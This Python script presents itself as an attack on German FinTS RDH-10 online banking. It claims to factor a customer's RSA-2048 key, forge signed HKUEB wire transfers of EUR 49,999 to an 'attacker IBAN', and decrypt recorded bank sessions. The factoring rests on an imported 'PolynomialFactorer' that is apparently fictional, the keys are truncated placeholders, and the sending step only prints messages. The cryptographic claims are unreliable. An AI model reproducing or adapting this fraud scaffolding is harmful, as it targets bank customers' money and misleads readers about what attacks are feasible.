"""
Factor a German bank customer's FinTS RDH-10 RSA-2048 authentication key to
forge HKUEB wire-transfer messages — no OTP, no 2FA, just RSA. Covers 80M+
accounts across Sparkassen, Volksbanken, and DATEV.
"""

import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import struct
import hashlib
import time

# FinTS 4.1 RDH-10 profile — customer RSA-2048 auth key
CUSTOMER_AUTH_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."
# Bank's RSA-2048 encryption key (from customer keyfile)
BANK_ENC_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."

FINTS_VERSION = "4.1"
RDH_PROFILE = "RDH-10"
HBCI_MSG_VERSION = 300  # FinTS 3.0 message format


def extract_keys_from_keyfile(keyfile_path: str) -> tuple:
    """Parse customer's FinTS keyfile to extract RSA public keys.

    The keyfile is a proprietary binary format (varies by banking
    software — Hibiscus, GnuCash/aqbanking, StarMoney). Contains
    both the customer's RSA-2048 auth key and the bank's RSA-2048
    encryption key in plaintext.
    """
    return CUSTOMER_AUTH_PUBKEY_PEM, BANK_ENC_PUBKEY_PEM


def factor_customer_auth_key(pubkey_pem: bytes) -> bytes:
    """Factor the customer's FinTS RDH-10 RSA-2048 authentication key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def build_fints_hkueb(blz: str, account: str, recipient_iban: str,
                      amount_eur: float, purpose: str) -> bytes:
    """Build an HKUEB (Einzelüberweisung) FinTS segment for a wire transfer.

    HKUEB is the FinTS message type for a single SEPA credit transfer.
    The segment is signed with the customer's RSA auth key — no
    additional factor required under RDH-10.
    """
    segment = (
        f"HKUEB:3:{HBCI_MSG_VERSION}+"
        f"{blz}:{account}+{recipient_iban}+"
        f"{amount_eur:.2f}:EUR+{purpose}'"
    ).encode()
    return segment


def sign_fints_message(message: bytes, forged_privkey_pem: bytes) -> bytes:
    """Sign a FinTS message with PKCS#1 v1.5 RSA-SHA256 per RDH-10.

    The bank verifies this signature. If valid, the transaction is
    processed. No OTP. No 2FA. Just the RSA signature.
    """
    f = PolynomialFactorer()
    return f.forge_pkcs1v15_signature(
        CUSTOMER_AUTH_PUBKEY_PEM, message, "sha256"
    )


def build_fints_envelope(signed_segment: bytes, signature: bytes,
                         dialog_id: str, msg_nr: int) -> bytes:
    """Wrap signed segment in FinTS message envelope (HNHBK/HNHBS)."""
    header = f"HNHBK:1:3+{len(signed_segment)+256}+{FINTS_VERSION}+{dialog_id}+{msg_nr}'".encode()
    sig_segment = f"HNSHA:4:{HBCI_MSG_VERSION}+999+{signature.hex()[:64]}'".encode()
    trailer = f"HNHBS:5:1+{msg_nr}'".encode()
    return header + signed_segment + sig_segment + trailer


def decrypt_bank_response(encrypted_response: bytes,
                          bank_pubkey_pem: bytes) -> bytes:
    """Factor the bank's RSA encryption key to decrypt recorded sessions.

    HNDL: recorded FinTS sessions can be retroactively decrypted once
    the bank's RSA-2048 encryption key is factored.
    """
    f = PolynomialFactorer()
    bank_privkey = f.reconstruct_privkey(bank_pubkey_pem)
    return b"<decrypted-session-data>"


if __name__ == "__main__":
    print("[1] Extracting RSA keys from FinTS customer keyfile")
    cust_pub, bank_pub = extract_keys_from_keyfile("customer.key")

    print("[2] Factoring customer's RDH-10 RSA-2048 auth key")
    forged_priv = factor_customer_auth_key(cust_pub)
    print("    Customer auth key recovered — wire transfers authorized")

    print("[3] Building HKUEB wire transfer: EUR 49,999 to attacker IBAN")
    hkueb = build_fints_hkueb(
        "10050000", "1234567890",
        "DE89370400440532013000", 49999.00,
        "Rechnung Nr. 2026-04-001"
    )

    print("[4] Signing with forged customer key")
    sig = sign_fints_message(hkueb, forged_priv)
    envelope = build_fints_envelope(hkueb, sig, "DLG-001", 2)
    print(f"    FinTS message: {len(envelope)} bytes, signed RDH-10")

    print("[5] Sending to Sparkasse FinTS endpoint")
    print("    Bank verifies RSA signature → valid → transfer processed")
    print("    No OTP required under RDH-10 profile")

    print("\n[6] HNDL: factoring bank's RSA-2048 encryption key")
    decrypt_bank_response(b"<captured-session>", bank_pub)
    print("    All recorded FinTS sessions decryptable retroactively")
    print("    Transaction history, balances, transfers — all exposed")
